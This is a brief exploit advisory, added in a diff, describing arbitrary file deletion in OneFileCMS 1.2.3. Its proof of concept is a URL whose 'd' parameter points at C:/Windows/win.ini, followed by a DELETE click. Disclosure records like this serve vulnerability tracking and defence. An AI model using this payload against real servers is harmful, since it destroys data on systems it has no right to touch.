@@ -1,0 +1,10 @@
+# Exploit Title : OneFileCMS 1.2.3 Arbitrary File Deletion
+# Data : 2012-05-17
+# Author : i2sec-ji su choi
+# Software Link : https://github.com/downloads/Self-Evident/OneFileCMS/OneFileCMS_1.2.3.zip
+# Versions : OneFileCMS Version 1.2.3
+# Tested on : Windows 7
+# Description : Files can be deleted
+# PoC :
+1. http://[server]/onefilecms.php?d=C:/Windows/win.ini
+2. DELETE Click
